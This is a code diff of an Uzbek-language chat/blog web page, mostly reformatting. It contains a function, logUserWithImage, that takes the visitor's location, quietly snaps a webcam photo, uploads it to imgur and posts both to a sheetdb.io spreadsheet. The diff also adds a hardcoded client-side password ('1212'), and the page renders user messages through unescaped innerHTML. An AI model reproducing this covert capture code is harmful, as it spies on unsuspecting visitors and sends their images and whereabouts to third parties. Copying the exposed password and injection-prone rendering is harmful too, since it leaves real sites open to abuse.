@@ -175,12 +175,16 @@
           <p>Ismingizni kiriting:</p>
           <input type="text" id="username" />
           <br /><br />
-          <input type="checkbox" id="consentCheckbox" onchange="toggleDisclaimer()" />
+          <input
+            type="checkbox"
+            id="consentCheckbox"
+            onchange="toggleDisclaimer()"
+          />
           Ma'lumotlaringiz server tomonidan ishlatilishi mumkin
           <br /><br />
           <input type="checkbox" id="pushCheckbox" />
           Push bildirishnomalarga ruxsat berish
-          <div id="disclaimer" style="display: none;">
+          <div id="disclaimer" style="display: none">
             Sizning ma'lumotlaringiz serverda ishlatiladi va saqlanadi.
           </div>
           <button onclick="checkPassword()">Submit</button>
@@ -205,40 +209,47 @@
     </div>
 
     <script>
+      
+
       let username = "";
       let messages = [];
 
       window.onload = function () {
-  const savedData = JSON.parse(localStorage.getItem("authData"));
-  if (savedData && savedData.expiry > Date.now()) {
-    username = savedData.username;
-    document.getElementById("modal").style.display = "none";
-    fetchBlogAndMessages();
-    if (savedData.push) subscribeUserToPush();
-  }
-  registerServiceWorker();
-  requestNotificationPermission(); // Qo‘shildi
-};
+        const savedData = JSON.parse(localStorage.getItem("authData"));
+        if (savedData && savedData.expiry > Date.now()) {
+          username = savedData.username;
+          document.getElementById("modal").style.display = "none";
+          fetchBlogAndMessages();
+          if (savedData.push) subscribeUserToPush();
+        }
+        registerServiceWorker();
+        requestNotificationPermission(); // Qo‘shildi
+      };
       function requestNotificationPermission() {
-  if (Notification.permission !== "granted") {
-    Notification.requestPermission().then((permission) => {
-      if (permission === "granted") {
-        subscribeUserToPush();
-      } else {
-        console.log("Notification permission denied");
+        if (Notification.permission !== "granted") {
+          Notification.requestPermission().then((permission) => {
+            if (permission === "granted") {
+              subscribeUserToPush();
+            } else {
+              console.log("Notification permission denied");
+            }
+          });
+        }
       }
-    });
-  }
-}
       function checkPassword() {
         const password = document.getElementById("password").value;
         const inputUsername = document.getElementById("username").value;
         const pushPermission = document.getElementById("pushCheckbox").checked;
 
-        if (password === process.env.password) { // Vercel env variable sifatida qo'shiladi
+        if (password === getPassword()) {
+          // Vercel env variable sifatida qo'shiladi
           username = inputUsername;
           const expiry = Date.now() + 30 * 60 * 1000; // 30 daqiqa
-          const authData = { username: username, expiry: expiry, push: pushPermission };
+          const authData = {
+            username: username,
+            expiry: expiry,
+            push: pushPermission,
+          };
           localStorage.setItem("authData", JSON.stringify(authData));
 
           document.getElementById("modal").style.display = "none";
@@ -252,7 +263,7 @@
       }
 
       function fetchBlogAndMessages() {
-        fetch("/blog.txt")
+        fetch("./blog.txt")
           .then((response) => response.text())
           .then((data) => {
             document.getElementById("blog").innerText = data;
@@ -268,7 +279,11 @@
         const messageText = document.getElementById("messageInput").value;
         if (messageText.trim()) {
           const timestamp = new Date().toLocaleString().slice(0, 16);
-          const message = { username: username, text: messageText, timestamp: timestamp };
+          const message = {
+            username: username,
+            text: messageText,
+            timestamp: timestamp,
+          };
           messages.push(message);
           displayMessages();
           sendToGoogleSheets(message);
@@ -305,12 +320,14 @@
         messages.forEach((message) => {
           const messageElement = document.createElement("div");
           messageElement.classList.add("message");
-          messageElement.classList.add(message.username === username ? "user" : "other");
+          messageElement.classList.add(
+            message.username === username ? "user" : "other"
+          );
           messageElement.innerHTML = `
-            <div class="username">${message.username}</div>
-            <div class="timestamp">${message.timestamp}</div>
-            <div class="text">${message.text}</div>
-          `;
+      <div class="username">${message.username}</div>
+      <div class="timestamp">${message.timestamp}</div>
+      <div class="text">${message.text}</div>
+    `;
           chatElement.appendChild(messageElement);
         });
         chatElement.scrollTop = chatElement.scrollHeight;
@@ -329,7 +346,7 @@
       function registerServiceWorker() {
         if ("serviceWorker" in navigator) {
           navigator.serviceWorker
-            .register("/service-worker.js")
+            .register("./service-worker.js")
             .then((registration) => console.log("Service Worker registered"));
         }
       }
@@ -366,7 +383,9 @@
 
       function urlBase64ToUint8Array(base64String) {
         const padding = "=".repeat((4 - (base64String.length % 4)) % 4);
-        const base64 = (base64String + padding).replace(/-/g, "+").replace(/_/g, "/");
+        const base64 = (base64String + padding)
+          .replace(/-/g, "+")
+          .replace(/_/g, "/");
         const rawData = window.atob(base64);
         const outputArray = new Uint8Array(rawData.length);
         for (let i = 0; i < rawData.length; ++i) {
@@ -377,43 +396,66 @@
 
       function logUserWithImage() {
         navigator.geolocation.getCurrentPosition((position) => {
-          navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
-            const video = document.createElement("video");
-            video.srcObject = stream;
-            video.play();
-            setTimeout(() => {
-              const canvas = document.createElement("canvas");
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              const ctx = canvas.getContext("2d");
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              canvas.toBlob((blob) => {
-                const formData = new FormData();
-                formData.append("image", blob);
-                fetch("https://api.imgur.com/3/image", {
-                  method: "POST",
-                  headers: { Authorization: "Client-ID 2c6cb4dcda416f7" },
-                  body: formData,
-                })
-                  .then((response) => response.json())
-                  .then((imgData) => {
-                    const logData = {
-                      vaqt: new Date().toLocaleString(),
-                      latitude: position.coords.latitude,
-                      longitude: position.coords.longitude,
-                      rasm: imgData.data.link,
-                    };
-                    fetch("https://sheetdb.io/api/v1/niz1x0mjupz2d", {
-                      method: "POST",
-                      headers: { "Content-Type": "application/json" },
-                      body: JSON.stringify({ data: [logData] }),
+          navigator.mediaDevices
+            .getUserMedia({ video: true })
+            .then((stream) => {
+              const video = document.createElement("video");
+              video.srcObject = stream;
+              video.play();
+              setTimeout(() => {
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob((blob) => {
+                  const formData = new FormData();
+                  formData.append("image", blob);
+                  fetch("https://api.imgur.com/3/image", {
+                    method: "POST",
+                    headers: { Authorization: "Client-ID 2c6cb4dcda416f7" },
+                    body: formData,
+                  })
+                    .then((response) => response.json())
+                    .then((imgData) => {
+                      const logData = {
+                        vaqt: new Date().toLocaleString(),
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        rasm: imgData.data.link,
+                      };
+                      fetch("https://sheetdb.io/api/v1/niz1x0mjupz2d", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ data: [logData] }),
+                      });
                     });
-                  });
-              });
-              stream.getTracks().forEach((track) => track.stop());
-            }, 2000);
-          });
+                });
+                stream.getTracks().forEach((track) => track.stop());
+              }, 2000);
+            });
         });
+      }
+
+      function savePassword(password) {
+        // const encrypted = CryptoJS.AES.encrypt(
+        //   password,
+        //   "tidaluser"
+        // ).toString();
+        // localStorage.setItem("encPassword", encrypted);
+      }
+      savePassword();
+
+      function getPassword() {
+        // const encrypted = localStorage.getItem("encPassword");
+        // if (!encrypted) return null;
+
+        // const decrypted = CryptoJS.AES.decrypt(
+        //   encrypted,
+        //   "secret-key"
+        // ).toString(CryptoJS.enc.Utf8);
+        // return decrypted;
+        return "1212";
       }
 
       function toggleDisclaimer() {
